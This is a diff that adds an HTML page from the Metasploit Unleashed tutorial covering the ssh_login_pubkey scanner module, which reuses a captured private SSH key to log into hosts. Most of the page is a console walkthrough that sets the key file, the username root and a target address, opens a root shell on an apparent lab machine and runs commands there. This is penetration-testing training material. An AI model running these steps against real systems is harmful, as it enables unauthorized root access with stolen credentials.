@@ -1,0 +1,25 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>auxiliary/scanner/ssh/ssh_login_pubkey</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">auxiliary/scanner/ssh/ssh_login_pubkey</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">Using public key authentication for SSH
+is highly regarded as being
+far more secure than using usernames and passwords to authenticate. The
+caveat to this is that if the private key portion of the key pair is
+not kept secure, the security of the configuration is thrown right out
+the window. If, during an engagement, you get access to a private SSH
+key, you can use the ssh_login_pubkey module to attempt to login across
+a range of devices.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey<br>msf auxiliary(ssh_login_pubkey) &gt; show options<br><br>Module options:<br><br>   Name              Current Setting  Required  Description<br>   ----              ---------------  --------  -----------<br>   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5<br>   KEY_FILE                           no        Filename of one or several cleartext private keys.<br>   RHOSTS                             yes       The target address range or CIDR identifier<br>   RPORT             22               yes       The target port<br>   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host<br>   THREADS           1                yes       The number of concurrent threads<br>   USERNAME                           no        A specific username to authenticate as<br>   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line<br>   USER_FILE                          no        File containing usernames, one per line<br>   VERBOSE           true             yes       Whether to print output for all attempts<br><br>msf auxiliary(ssh_login_pubkey) &gt; set KEY_FILE /tmp/id_rsa<br>KEY_FILE =&gt; /tmp/id_rsa<br>msf auxiliary(ssh_login_pubkey) &gt; set USERNAME root<br>USERNAME =&gt; root<br>msf auxiliary(ssh_login_pubkey) &gt; set RHOSTS 192.168.1.154<br>RHOSTS =&gt; 192.168.1.154<br>msf auxiliary(ssh_login_pubkey) &gt; run<br><br>[*] 192.168.1.154:22 - SSH - Testing Cleartext Keys<br>[*] 192.168.1.154:22 - SSH - Trying 1 cleartext key per user.<br>[*] Command shell session 1 opened (?? -&gt; ??) at 2010-09-09 17:17:56 -0600<br>[+] 192.168.1.154:22 - SSH - Success: 'root':'57:c3:11:5d:77:c5:63:90:33:2d:c5:c4:99:78:62:7a' 'uid=0(root) gid=0(root) groups=0(root) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '<br>[*] Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed<br>msf auxiliary(ssh_login_pubkey) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br>ls<br>reset_logs.sh<br>id<br>uid=0(root) gid=0(root) groups=0(root)<br>exit<br>[*] Command shell session 1 closed.<br>msf auxiliary(ssh_login_pubkey) &gt;</pre>
+</body>
+</html>
